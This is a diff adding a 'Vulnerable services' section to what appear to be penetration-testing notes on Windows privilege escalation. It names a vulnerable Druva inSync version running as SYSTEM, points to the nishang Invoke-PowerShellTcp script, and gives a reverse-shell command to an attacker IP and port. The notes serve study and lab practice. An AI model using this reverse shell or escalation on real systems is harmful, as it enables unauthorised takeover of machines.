@@ -37,3 +37,20 @@ See output generated before cracking
 hashcat -a 1 --stdout wordlist_mark.txt wordlist.mark 
 ```
 
+## Vulnerable services
+
+We can enumerate installed applications with:
+```
+wmic product get name
+```
+
+In the example given we find an appliation running as `SYSTEM` which has a known privilege escalation exploit: `Druva inSync 6.6.3`.
+
+We can use this script (https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1- to exploit the vulnerability. In the example a user is added but we could change the command to a reverse shell if we want:
+```
+Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.3 -Port 9443
+```
+
+
+
+
